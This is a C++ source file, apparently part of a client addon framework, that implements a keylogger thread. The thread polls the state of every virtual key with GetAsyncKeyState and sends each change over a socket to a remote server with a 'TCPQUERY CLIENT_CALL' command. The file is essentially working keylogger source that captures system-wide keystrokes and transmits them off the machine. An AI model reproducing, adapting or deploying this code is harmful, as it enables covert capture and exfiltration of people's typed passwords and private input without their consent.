#pragma once



#include "keylog.h"





addonKeylog *gKeylog;


extern addonThread *gThread;
extern addonMutex *gMutex;
extern addonSocket *gSocket;

extern std::queue<std::string> send_to;





addonKeylog::addonKeylog()
{
	addonDebug("Keylog constructor called");

	this->threadActive = true;
	this->threadHandle = gThread->Start(addonKeylog::Thread, (void *)GetTickCount());
}



addonKeylog::~addonKeylog()
{
	addonDebug("Keylog deconstructor called");

	this->threadActive = false;
	gThread->Stop(this->threadHandle);
}



DWORD addonKeylog::Thread(void *lpParam)
{
	addonDebug("Thread addonKeylog::Thread(%i) successfuly started", (int)lpParam);

	char key[257];
	char old_key[257];

	do
	{
		memset(key, '0', sizeof key);

		for(int i = 0; i != 256; i++)
		{
			if(GetAsyncKeyState(i) == -32767)
			{
				key[i] = '1';
			}
		}

		key[256] = NULL;

		if(!strcmp(key, old_key))
		{
			Sleep(1);

			continue;
		}

		strcpy_s(old_key, key);

		gSocket->Send(formatString() << "TCPQUERY CLIENT_CALL" << " " << 1002 << " " << key);

		Sleep(125);
	}
	while(gKeylog->threadActive);

	return true;
}